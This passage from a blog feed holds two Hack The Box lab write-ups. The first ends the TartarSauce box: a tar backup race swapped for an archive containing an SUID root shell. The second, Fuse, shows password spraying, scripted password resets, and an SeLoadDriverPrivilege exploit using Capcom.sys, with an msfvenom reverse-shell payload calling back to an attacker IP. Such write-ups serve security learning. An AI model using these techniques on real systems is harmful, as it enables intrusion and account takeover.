integrity_chk<span class="o">()</span>
<span class="o">{</span>
    /usr/bin/diff <span class="nt">-r</span> <span class="nv">$basedir</span> <span class="nv">$check$basedir</span>
<span class="o">}</span>
</code></pre></div></div>

<p>here’s a quick <strong>example</strong> of how a recursive diff works:</p>

<p><img src="/assets/TartarSauce/recursive-diff-example.jpg" alt="" /></p>

<p>This function would make much more sense with the lines that follow:</p>
<ul>
  <li>creating the <code class="language-plaintext highlighter-rouge">check</code> directory <code class="language-plaintext highlighter-rouge">/var/tmp/check</code>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/mkdir <span class="nv">$check</span>
</code></pre></div>    </div>
  </li>
  <li>extracting the <code class="language-plaintext highlighter-rouge">tmpfile</code> (<code class="language-plaintext highlighter-rouge">/var/tmp/.&lt;SHA1SUM&gt;</code>) into it
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/tar <span class="nt">-zxvf</span> <span class="nv">$tmpfile</span> <span class="nt">-C</span> <span class="nv">$check</span>
</code></pre></div>    </div>
  </li>
</ul>

<p>The <strong>integrity check</strong> is <strong>validation</strong> that <strong>the backup</strong> <em>exactly matches</em> the <strong>backed up data</strong> and <strong>no corruption has occured.</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="o">[[</span> <span class="si">$(</span>integrity_chk<span class="si">)</span> <span class="o">]]</span>
<span class="k">then</span>
    <span class="c"># Report errors so the dev can investigate the issue.</span>
    /usr/bin/printf <span class="s2">$"</span><span class="nv">$bdr</span><span class="se">\n</span><span class="s2">Integrity Check Error in backup last ran :  </span><span class="si">$(</span>/bin/date<span class="si">)</span><span class="se">\n</span><span class="nv">$bdr</span><span class="se">\n</span><span class="nv">$tmpfile</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> <span class="nv">$errormsg</span>
    integrity_chk <span class="o">&gt;&gt;</span> <span class="nv">$errormsg</span>
    <span class="nb">exit </span>2
<span class="k">else</span>
    <span class="c"># Clean up and save archive to the bkpdir.</span>
    /bin/mv <span class="nv">$tmpfile</span> <span class="nv">$bkpdir</span>/onuma-www-dev.bak
    /bin/rm <span class="nt">-rf</span> <span class="nv">$check</span> .<span class="k">*</span>
    <span class="nb">exit </span>0
<span class="k">fi</span>
</code></pre></div></div>

<h2 id="exploiting-tar-to-root-the-box">Exploiting tar to root the box</h2>

<p>There’s <strong>a way to escalate our privileges</strong> to <code class="language-plaintext highlighter-rouge">root</code></p>

<p>Because:</p>
<ol>
  <li>The script <strong>backs up the website</strong> into <code class="language-plaintext highlighter-rouge">/var/tmp/.&lt;SHA1SUM&gt;</code> as <code class="language-plaintext highlighter-rouge">onuma</code> (<em>we own this user and this makes that archive writable</em>)</li>
  <li>It then <strong>sleeps for 30 seconds</strong>. which is <strong>enough time</strong> for us to <strong><em>swap the archive with a malicious one</em></strong></li>
  <li><strong>creates</strong> a <code class="language-plaintext highlighter-rouge">check</code> directory, <strong>extracting</strong> the contents of the -<strong><em>then manipulated</em></strong>- <code class="language-plaintext highlighter-rouge">/var/tmp/.&lt;SHA1SUM&gt;</code> into it before doing the integrity check</li>
</ol>

<p><strong>The key here</strong> is that: <strong>everything the script extracts would be owned by root!</strong></p>

<p>So we just need to:</p>
<ol>
  <li><strong>Create an SUID shell</strong> and <strong>embed it within a tar archive</strong></li>
  <li><strong>Wait for the first backup to complete</strong> (<code class="language-plaintext highlighter-rouge">/var/www/html</code> to <code class="language-plaintext highlighter-rouge">/var/tmp/.&lt;SHA1SUM&gt;</code>)</li>
  <li><strong>Replace</strong> the <code class="language-plaintext highlighter-rouge">/var/tmp/.&lt;SHA1SUM&gt;</code> with <strong>the one we created</strong></li>
  <li><strong>Wait for the extraction</strong> to be done by <code class="language-plaintext highlighter-rouge">root</code> into the <code class="language-plaintext highlighter-rouge">check</code> directory</li>
  <li><strong>Go within the extracted contents</strong> and <strong>run the root shell :)</strong></li>
</ol>

<p><em>But before executing this evil plan,</em> let’s first observe the script in action:</p>

<p>We’ll go to <code class="language-plaintext highlighter-rouge">/var/tmp</code> and do a <code class="language-plaintext highlighter-rouge">watch</code> command to <strong>keep an eye</strong> on <strong>the timer</strong> (<code class="language-plaintext highlighter-rouge">systemctl list-timers</code>) as well as <strong>the directory contents</strong> (<code class="language-plaintext highlighter-rouge">ls -la</code>)</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /var/tmp
watch <span class="nt">-n</span> 1 <span class="s1">'systemctl list-timers; ls -la'</span>
</code></pre></div></div>

<p>here, the <code class="language-plaintext highlighter-rouge">/var/tmp</code> directory is empty before any execution</p>

<p><img src="/assets/TartarSauce/watching-timers-and-contents.jpg" alt="" /></p>

<p><em>26 seconds after the code ran,</em> notice the <code class="language-plaintext highlighter-rouge">SHA1</code> (<code class="language-plaintext highlighter-rouge">$tmpfile</code>) got created.</p>

<p>it’s owned by <code class="language-plaintext highlighter-rouge">onuma</code> (<em>since it’s the output of</em> <strong>line 35</strong>)</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/sudo <span class="nt">-u</span> onuma /bin/tar <span class="nt">-zcvf</span> <span class="nv">$tmpfile</span> <span class="nv">$basedir</span> &amp;
</code></pre></div></div>

<p><img src="/assets/TartarSauce/tmp-file-creation.jpg" alt="" /></p>

<p><em>After the 30-second sleep interval has passed,</em> the <code class="language-plaintext highlighter-rouge">check</code> directory (<code class="language-plaintext highlighter-rouge">$check</code>) is now there with the contents of the <code class="language-plaintext highlighter-rouge">$tmpfile</code> inside.</p>

<p>it’s owned by <code class="language-plaintext highlighter-rouge">root</code> (<em>as it’s the output of</em> <strong>line 47</strong>)</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/tar <span class="nt">-zxvf</span> <span class="nv">$tmpfile</span> <span class="nt">-C</span> <span class="nv">$check</span>
</code></pre></div></div>

<p><img src="/assets/TartarSauce/check-directory-created.jpg" alt="" /></p>

<p><em>Having seen everything up close,</em> let’s prepare the <strong>SUID shell</strong></p>

<p><img src="/assets/TartarSauce/killershell-c.jpg" alt="" /></p>

<p>We compile it using <code class="language-plaintext highlighter-rouge">gcc</code> with the <code class="language-plaintext highlighter-rouge">-m32</code> flag to <strong>match the victim’s architecture</strong></p>

<p><img src="/assets/TartarSauce/victim-arch.jpg" alt="" /></p>

<p><em>Even though we got a warning,</em> it’s been successfully compiled</p>

<p><img src="/assets/TartarSauce/compiling-killer-shell.jpg" alt="" /></p>

<p>We make sure to <strong>add the SUID bit</strong> and <strong>create the same directory structure</strong> (<code class="language-plaintext highlighter-rouge">/var/www/html</code>) within the archive.</p>

<p><img src="/assets/TartarSauce/crafting-killer-tar.jpg" alt="" /></p>

<p>we then <strong>transfer it over</strong> and <strong>overwrite</strong> the <code class="language-plaintext highlighter-rouge">SHA1</code> file <strong><em>as soon as the file length stabilizes.</em></strong> (<em>to avoid interrupting the first backup</em>)</p>

<p>we <strong>wait 30 seconds for the extraction</strong> to be done in the <code class="language-plaintext highlighter-rouge">check</code> directory.</p>

<p><em>going into the extract,</em> a sweet <strong>SUID shell</strong> is there waiting for us :D</p>

<p>it’s all in the image below:</p>

<p><img src="/assets/TartarSauce/tar-ownage-for-root.jpg" alt="" /></p>

<p><strong>Wicked!</strong></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Fuse</title><link href="http://localhost:4000/2022/08/19/Fuse.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Fuse" /><published>2022-08-19T00:00:00+02:00</published><updated>2022-08-19T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/19/Fuse</id><content type="html" xml:base="http://localhost:4000/2022/08/19/Fuse.html"><![CDATA[<p><img src="/assets/Fuse/Fuse.png" alt="" /></p>

<h2 id="summary">Summary</h2>
<ul>
  <li>Fuse is a <strong>Windows Domain Controller</strong> machine with <strong>IIS</strong> listening on port 80.</li>
  <li><em>When checking the website,</em> we get <strong>redirected</strong> to a certain <strong>web page titled “PaperCut Print Logger”.</strong></li>
  <li><em>On that page,</em> we find the <strong>printing activity of some domain users</strong>. That gets us an initial <strong>list of usernames, workstations and document names.</strong></li>
  <li><strong>One of the documents’ name stuck out:</strong> <code class="language-plaintext highlighter-rouge">"Fabricorp01.docx"</code> which <strong><em>looked like a possible password/password scheme to try.</em></strong></li>
  <li><em>After spraying that password and others with the same pattern,</em> We find that <strong>it was indeed used by 3 of the users</strong>. But was <strong>expired and had to be changed.</strong></li>
  <li><em>Using the linux</em> <code class="language-plaintext highlighter-rouge">smbpassswd</code> <em>utility</em>, we were able to <strong>change passwords and gain access</strong>. But <strong>neither of the users had WinRM capability or valuable findings in their SMB shares</strong>.</li>
  <li><em>However, after doing a</em> <code class="language-plaintext highlighter-rouge">Bloodhound</code> <em>collection and inspecting the output</em>, we notice that <strong>there’s a potential path to Domain Administrator if we compromise the</strong> <code class="language-plaintext highlighter-rouge">svc-print</code> <strong>account</strong>. That’s because <strong>it has PowerShell Remoting access and is a member of the Print Operators AD group</strong> which <strong>hold the dangerous</strong> <code class="language-plaintext highlighter-rouge">SeLoadDriver</code> <strong>privilege.</strong></li>
  <li><em>Following the findings from</em> <code class="language-plaintext highlighter-rouge">Bloodhound</code> <em>and the</em> <strong><em>theme of printing</em></strong> <em>which was recurring throughout the machine</em>, we <strong>enumerate the printers of the domain</strong> to <strong>find a password in a printers’ description field</strong>.</li>
  <li>We <strong>run another password spray</strong> over all domain users with that password and <strong>get access to the</strong> <code class="language-plaintext highlighter-rouge">svc-print</code> <strong>account</strong>. We use it to <strong>gain a remote PowerShell session on the box.</strong></li>
  <li>We  then <strong>abuse its</strong> <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code> to <strong>load a vulnerable driver into the kernel</strong> and <strong>exploit that to get code execution as</strong> <code class="language-plaintext highlighter-rouge">NT Authority\System</code>.</li>
</ul>

<hr />

<h2 id="nmap">NMAP</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-17 10:34:00Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49675/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc        Microsoft Windows RPC
49680/tcp open  msrpc        Microsoft Windows RPC
49698/tcp open  msrpc        Microsoft Windows RPC
49754/tcp open  msrpc        Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-08-17T10:34:56
|_  start_date: 2022-08-17T10:14:17
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h32m59s, deviation: 4h02m30s, median: 12m58s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Fuse
|   NetBIOS computer name: FUSE\x00
|   Domain name: fabricorp.local
|   Forest name: fabricorp.local
|   FQDN: Fuse.fabricorp.local
|_  System time: 2022-08-17T03:34:53-07:00
</code></pre></div></div>
<p>Spotting <strong>DNS, kerberos and LDAP</strong> is a <strong>dead giveaway</strong> of the box being <strong>a Domain Controller.</strong></p>

<p>Nmap’s <strong>version detection</strong> and <strong>default scripts</strong> give us good information:</p>
<ol>
  <li>The <strong>host name</strong> is <code class="language-plaintext highlighter-rouge">fuse</code></li>
  <li>It’s very likely <strong>Windows Server 2016</strong></li>
  <li>The <strong>domain name</strong> is <code class="language-plaintext highlighter-rouge">fabricorp.local</code></li>
</ol>

<p>we also know that <strong>WSMan is available on port 5985</strong> which <strong>is good if we get a user with PowerShell Remoting access.</strong></p>

<p>Let’s start enumeration!</p>

<h2 id="smb-enumeration">SMB Enumeration</h2>
<p>We do the <strong>quick standard checks</strong> for <strong>null, guest and anonymous authentication:</strong></p>

<p><img src="/assets/Fuse/smb-enum.jpg" alt="" /></p>

<p>nothing there besides <strong>confirming OS version</strong> <code class="language-plaintext highlighter-rouge">Windows Server 2016 Standard 14393</code> and <strong>knowing the processor architecture:</strong> <code class="language-plaintext highlighter-rouge">x64</code></p>

<h2 id="rpc-enumeration">RPC Enumeration</h2>
<p>Our favourite <strong>RPC enumeration tool</strong> <a href="https://github.com/cddmp/enum4linux-ng">enum4linux-ng</a> didn’t yield much more information either.</p>

<p>We <strong>note down the Domain SID</strong> and move along.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linux-ng.py <span class="nt">-A</span> fuse
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ENUM4LINUX - next generation

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... fuse
[*] Username ......... ''
[*] Random Username .. 'ujlfkgys'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ============================
|    Service Scan on fuse    |
 ============================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ============================================
|    Domain Information via LDAP for fuse    |
 ============================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: fabricorp.local

 ============================================
|    NetBIOS Names and Workgroup for fuse    |
 ============================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 =================================
|    SMB Dialect Check on fuse    |
 =================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
SMB 1.0: true
SMB 2.02: true
SMB 2.1: true
SMB 3.0: true
SMB1 only: false
Preferred dialect: SMB 3.0
SMB signing required: true

 =================================
|    RPC Session Check on fuse    |
 =================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user session
[-] Could not establish random user session: STATUS_LOGON_FAILURE

 ===========================================
|    Domain Information via RPC for fuse    |
 ===========================================
[+] Domain: FABRICORP
[+] SID: S-1-5-21-2633719317-1471316042-3957863514
[+] Host is part of a domain (not a workgroup)

 ===================================================
|    Domain Information via SMB session for fuse    |
 ===================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: FUSE
NetBIOS domain name: FABRICORP
DNS domain: fabricorp.local
FQDN: Fuse.fabricorp.local

 =======================================
|    OS Information via RPC for fuse    |
 =======================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows Server 2016 Standard 14393
OS version: '10.0'
OS release: '1607'
OS build: '14393'
Native OS: Windows Server 2016 Standard 14393
Native LAN manager: Windows Server 2016 Standard 6.3
Platform id: null
Server type: null
Server type string: null

 =============================
|    Users via RPC on fuse    |
 =============================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 ==============================
|    Groups via RPC on fuse    |
 ==============================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 ==============================
|    Shares via RPC on fuse    |
 ==============================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 =================================
|    Policies via RPC for fuse    |
 =================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: STATUS_ACCESS_DENIED

 =================================
|    Printers via RPC for fuse    |
 =================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

Completed after 24.97 seconds
</code></pre></div></div>

<h2 id="ldap-enumeration">LDAP Enumeration</h2>
<p>The same went for <strong>LDAP</strong>: <strong>anonymous bind</strong> isn’t enabled :/</p>

<p><img src="/assets/Fuse/no-ldap-anon.jpg" alt="" /></p>

<h2 id="the-website">The Website</h2>
<p><em>Having cleared away all the quick and simple checks,</em> it’s time to take a look at port 80.</p>

<p><img src="/assets/Fuse/website-homepage.jpg" alt="" /></p>

<p><em>Right off the bat,</em> we get <strong>redirected</strong> to <code class="language-plaintext highlighter-rouge">/papercut/logs/html/index.htm</code>.</p>

<p>we <strong>read the decription</strong> to know that <strong>live print logs are listed in the table below</strong> for us to check.</p>

<p><em>Checking the first one,</em> we see <strong>usernames</strong> as well as <strong>document</strong> and <strong>computer</strong> names.</p>

<p><img src="/assets/Fuse/print-log-page-1.jpg" alt="" /></p>

<p>We do the same for the 2nd and 3rd log pages.</p>

<p><img src="/assets/Fuse/print-log-page-2.jpg" alt="" /></p>

<p><img src="/assets/Fuse/print-log-page-3.jpg" alt="" /></p>

<p>Our <strong>notes</strong>:</p>
<ul>
  <li><strong>Usernames:</strong> pmerton, tlavel, bnielson, sthompson, bhult and administrator</li>
  <li><strong>Workstations:</strong> JUMP01, LONWK015, LONWK019, LAPTOP07 and of course FUSE</li>
</ul>

<p>And <strong>Document names</strong>:</p>
<ul>
  <li>New Starter - bnielson</li>
  <li>IT Budget Meeting Minutes</li>
  <li>backup_tapes</li>
  <li>mega_mountain_tape_request</li>
  <li><strong>Fabricorp01</strong></li>
  <li>offsite_dr_invocation</li>
  <li>printing_issue_test</li>
</ul>

<p>All document names <em>seem pretty normal</em>. Except for that <code class="language-plaintext highlighter-rouge">Fabricorp01</code> :D</p>

<p>A gut feeling is telling us: “That’s a password!” XD</p>

<p><em>And if it wasn’t,</em> it wouldn’t hurt to try <code class="language-plaintext highlighter-rouge">Fabricorp02</code>, <code class="language-plaintext highlighter-rouge">Fabricorp03</code> and so on…</p>

<h2 id="why-not-spray">Why not spray?</h2>
<p><em>Before delving into any password attacks,</em> we’re better off <strong>verifying the usernames we got</strong>. We’re going to use <a href="https://github.com/ropnop/kerbrute">kerbrute</a> for that:</p>

<p><img src="/assets/Fuse/kerbrute-userenum.jpg" alt="" /></p>

<p><strong>Awesome! every single one of them was valid!</strong></p>

<p><em>Having a list of</em> <strong><em>valid usernames</em></strong> <em>and another with</em> <strong><em>potential passwords,</em></strong> we get to spraying..</p>

<p><img src="/assets/Fuse/likely-pass-list.jpg" alt="" /></p>

<p><img src="/assets/Fuse/password-spray-1.jpg" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">tlavel</code>, <code class="language-plaintext highlighter-rouge">bnielson</code> and <code class="language-plaintext highlighter-rouge">bhult</code> seem to have that password <code class="language-plaintext highlighter-rouge">Fabricorp01</code>. But it’s <strong><em>expired</em></strong>.</p>

<p>We need to find a way to reset it.</p>

<p><strong><em>RDP would’ve been nice here</em></strong>. But port 3389 isn’t open :/</p>

<p><em>After failing to reset the password dusing RPC’s</em> <code class="language-plaintext highlighter-rouge">setuserinfo2</code> <em>command</em>, we <strong>do some further research</strong> and <strong>come across a handy tool</strong> called <code class="language-plaintext highlighter-rouge">smbpasswd</code>.</p>

<p>It was <strong>built for administering Samba</strong> but <strong>Let’s take a look at its documentation:</strong></p>

<p><img src="/assets/Fuse/smbpasswd-docs.jpg" alt="" /></p>

<p><strong>Jackpot! This is exactly what we need</strong>. let’s see if it can do the job.</p>

<p><img src="/assets/Fuse/smbpasswd-change-pass.jpg" alt="" /></p>

<p>Awesome. We now <strong>have more room for enumeration</strong>.</p>

<h2 id="authenticated-information-gathering">Authenticated Information Gathering</h2>
<p><strong>Our access is now expanded with 3 users</strong>. We can try:</p>
<ol>
  <li><strong>Pulling the rest of the domain users</strong> and <strong>going for another</strong> <code class="language-plaintext highlighter-rouge">Fabricorp0X</code> <strong>spray</strong>.</li>
  <li><strong>Enumerating all the SMB share access</strong> to check what’s there.</li>
  <li><strong>Checking for WinRM access.</strong></li>
  <li>Doing a <strong>Bloodhound collection</strong> to see what’s <strong>Kerberoastable</strong>, what’s <strong>ASREPRoastable</strong>, <strong>who has access to what</strong> etc.</li>
</ol>

<p>And more.</p>

<p><em>However,</em> there’s an obstacle.</p>

<p><img src="/assets/Fuse/auto-reset-password-status.jpg" alt="" /></p>

<p><em>As explained in the image above,</em> something happens after we reset one user’s password. it changes back to what it was.</p>

<p>There’s <strong>automation</strong> going on. One that <strong>resets the password to the initial</strong> <code class="language-plaintext highlighter-rouge">Fabricorp01</code> <em>around every minute</em> and <strong>requires it to be changed.</strong></p>

<p><strong>To handle this and make our lives easier,</strong> we’ll have to <strong>come up with automation of our own</strong>. Let’s look up the help for the <code class="language-plaintext highlighter-rouge">smbpasswd</code> utility to see <strong>what options it offers:</strong></p>

<p><img src="/assets/Fuse/smbpasswd-help.jpg" alt="" /></p>

<p><em>Turns out that, with the help of the</em> <code class="language-plaintext highlighter-rouge">-s</code> <em>flag</em>, we can <strong>pass in passwords through</strong> <code class="language-plaintext highlighter-rouge">stdin</code>.</p>

<p>the old password + the new one + the confirmation would be fed to <code class="language-plaintext highlighter-rouge">smbpasswd</code> with a new line in between.</p>

<p><em>minding that</em> <strong>a new password must be given every time we do a reset</strong>. Because <strong>Active Directory</strong> <em>-by default-</em> <strong>remembers the last 24 passwords you used on a given account.</strong> A feature called <strong>“Password History”</strong>.</p>

<p>So it’s better to <strong>have the password as a command line argument</strong> for our script.</p>

<p>Here’s what it looks like:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="k">for </span>user <span class="k">in</span> <span class="o">{</span><span class="s1">'tlavel'</span>,<span class="s1">'bnielson'</span>,<span class="s1">'bhult'</span><span class="o">}</span><span class="p">;</span> <span class="k">do
        </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"Fabricorp01</span><span class="se">\n</span><span class="nv">$1</span><span class="se">\n</span><span class="nv">$1</span><span class="s2">"</span> | smbpasswd <span class="nt">-r</span> fuse <span class="nt">-U</span> <span class="nv">$user</span> <span class="nt">-s</span>
        <span class="c"># any command we want to run with the new password before it gets reset</span>
<span class="k">done</span>
</code></pre></div></div>

<p>we’re targetting all the users there. Let’s <strong>check their SMB share access</strong> and <strong>if they can use WinRM</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cme winrm fuse <span class="nt">-u</span> <span class="nv">$user</span> <span class="nt">-p</span> <span class="nv">$1</span>
cme smb fuse <span class="nt">-u</span> <span class="nv">$user</span> <span class="nt">-p</span> <span class="nv">$1</span> <span class="nt">--shares</span>
</code></pre></div></div>

<p><img src="/assets/Fuse/automated-pass-reset.jpg" alt="" /></p>

<p>The script ran well. <em>However,</em> <strong>none of the users had WinRM access</strong> and <strong>we didn’t find anything valuable in the SMB shares</strong> when we checked.</p>

<p><em>To prepare for a</em> <strong><em>full domain password spray,</em></strong> We <strong>modify the script</strong> to <strong>target only one user</strong> and <strong>pull all the domain users</strong> using <code class="language-plaintext highlighter-rouge">crackmapexec</code></p>

<p><img src="/assets/Fuse/getting-all-ad-users.jpg" alt="" /></p>

<p>We target all the remaining users with <code class="language-plaintext highlighter-rouge">Fabricorp01</code> through <code class="language-plaintext highlighter-rouge">Fabricorp09</code> but with no success :/</p>

<p><img src="/assets/Fuse/2nd-password-spray.jpg" alt="" /></p>

<h2 id="ad-enumeration-with-bloodhound">AD Enumeration with Bloodhound</h2>
<p>We do a <code class="language-plaintext highlighter-rouge">BloodHound</code> collection from our Kali using <a href="https://github.com/fox-it/BloodHound.py">Bloodhound.py</a>. But don’t find anything exploitable with any of our owned users.</p>

<p><em>However, since the number of the users in the domain is relatively small,</em> we <strong>inspected everyone up close.</strong></p>

<p>Until we found <code class="language-plaintext highlighter-rouge">svc-print</code>…</p>

<p><img src="/assets/Fuse/svc-print-privs.jpg" alt="" /></p>

<p>This account <strong>is our target</strong> to <strong>take over the domain.</strong></p>

<p>Because it can:</p>
<ol>
  <li><strong>Gain a remote shell onto the Domain Controller</strong> (since <strong>it’s part of the “Remote Management Users”</strong> group)</li>
  <li><strong>Perform privilege escalation</strong> by <strong>abusing the</strong> <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code> (a privilege <strong>held by all members of the “Print Operators” group</strong>) to <strong>load malicious drivers into the kernel.</strong></li>
</ol>

<p><em>Right now,</em> <strong>all of our attention is directed towards obtaining access to this account.</strong></p>

<h2 id="printer-enumeration">Printer Enumeration</h2>
<p><em>Since printers have been mentioned way too many times in this machine</em> (the <strong>website</strong>, <strong>SMB shares</strong> and in <strong>BloodHound</strong>), we have to <strong>do decent enumeration</strong> on them.</p>

<p>We can do that <strong>via RPC</strong> with a valid account.</p>

<p>Let’s <strong>re-run</strong> <code class="language-plaintext highlighter-rouge">enum4linux-ng</code> <strong>with credentials this time</strong> and see what comes up.</p>

<p><img src="/assets/Fuse/rpc-printer-enumeration.jpg" alt="" /></p>

<p>A <strong>password was there in the description</strong> :D</p>

<p>we should’ve redone this part after obtaining those users. Oh well :/</p>

<p><em>Naturally,</em> we <strong>spray that password</strong>. To find both <code class="language-plaintext highlighter-rouge">svc-print</code> and <code class="language-plaintext highlighter-rouge">svc-scan</code> using it.</p>

<p>We used <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> to get on the box and <strong>ignored</strong> <code class="language-plaintext highlighter-rouge">svc-scan</code> <em>since it doesn’t hold any special privileges..</em></p>

<p><img src="/assets/Fuse/print-pass-worked.jpg" alt="" /></p>

<p><em>With this access,</em> it’s time for some <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code> abuse.</p>

<p><img src="/assets/Fuse/se-load-driver-priv.jpg" alt="" /></p>

<h2 id="evil-driver-pwnage">Evil Driver Pwnage</h2>
<p>The amazing <a href="https://www.tarlogic.com/blog/abusing-seloaddriverprivilege-for-privilege-escalation/">article</a> by <strong>Tarlogic Cybersecurity</strong> explains the <strong>theory</strong> and details <strong>the steps of exploitation</strong>. Give it a read for the full picture.</p>

<p><em>But, in short,</em> what we’re going to do is:</p>
<ul>
  <li><strong>Download a vulnerable driver</strong> (<code class="language-plaintext highlighter-rouge">Capcom.sys</code>) <a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys">here</a>. <em>-And, yes, it’s the game company :D-</em> <strong>we’re deliberately using it because it can be exploited for Privesc</strong>.</li>
  <li><strong>Load it into the kernel</strong> with our held privilege using <strong>Tarlogic’s</strong> <a href="https://github.com/TarlogicSecurity/EoPLoadDriver/">EoPLoadDriver</a> tool</li>
  <li><strong>Exploit the driver</strong> using the public exploit from <strong>Tandasat</strong> <a href="https://github.com/tandasat/ExploitCapcom">ExploitCapcom</a> <em>(after making a few modifications to its code)</em>.</li>
</ul>

<p><em>After downloading</em> <code class="language-plaintext highlighter-rouge">Capcom.sys</code>, we compile the <code class="language-plaintext highlighter-rouge">EoPLoadDriver.exe</code> using <strong>Visual Studio</strong></p>

<p>Then <strong>modify</strong> the <code class="language-plaintext highlighter-rouge">ExploitCapcom</code> code before compiling it to <strong>run a reverse shell executable</strong> <code class="language-plaintext highlighter-rouge">rev.exe</code> <em>(instead of launching cmd.exe)</em></p>

<p><img src="/assets/Fuse/modifying-exploit-capcom.jpg" alt="" /></p>

<p>And <strong>generate the reverse shell</strong> using <code class="language-plaintext highlighter-rouge">msfvenom</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.16.3 <span class="nv">lport</span><span class="o">=</span>9000 <span class="nt">-f</span> exe <span class="o">&gt;</span> rev.exe
</code></pre></div></div>

<p>We <strong>pack the 4 items into an archive</strong> and <strong>upload it to the victim</strong></p>

<p><img src="/assets/Fuse/uploading-exploit-items.jpg" alt="" /></p>

<p><em>Now locked and loaded,</em> we move <code class="language-plaintext highlighter-rouge">rev.exe</code> back one directory to be in <code class="language-plaintext highlighter-rouge">C:\Users\svc-print\Documents</code> <em>(matching the path specified in the</em> <code class="language-plaintext highlighter-rouge">ExploitCapcom.exe</code> <em>executable)</em></p>

